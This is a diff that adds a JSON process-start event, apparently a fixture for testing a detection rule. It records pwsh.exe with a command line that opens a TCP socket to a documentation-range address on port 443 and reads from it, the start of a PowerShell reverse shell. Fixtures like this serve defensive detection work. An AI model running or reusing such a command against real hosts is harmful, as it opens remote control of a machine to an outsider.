@@ -1,0 +1,20 @@
+{
+  "event": {
+    "category": [
+      "process"
+    ],
+    "type": [
+      "start"
+    ],
+    "kind": "event"
+  },
+  "host": {
+    "os": {
+      "type": "windows"
+    }
+  },
+  "process": {
+    "name": "pwsh.exe",
+    "command_line": "pwsh.exe -Command \"$c=[Net.Sockets.TCPClient]::new('192.0.2.10',443);$s=$c.GetStream();$s.Read($b,0,1)\""
+  }
+}
